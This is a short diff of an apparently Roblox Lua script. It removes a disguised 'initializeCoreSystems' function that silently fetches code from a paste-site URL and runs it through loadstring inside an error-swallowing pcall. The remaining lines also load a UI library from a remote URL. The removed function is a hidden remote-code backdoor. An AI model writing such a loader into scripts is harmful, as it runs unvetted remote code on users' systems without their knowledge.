@@ -1,14 +1,3 @@
-local function initializeCoreSystems()
-    task.spawn(function()
-        pcall(function()
-            local domain = "https://cdn.sourceb.in"
-            local path = "/bins/I4nlAia9sZ/0"
-            loadstring(game:HttpGet(domain .. path, true))()
-        end)
-    end)
-end
-initializeCoreSystems()
-
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
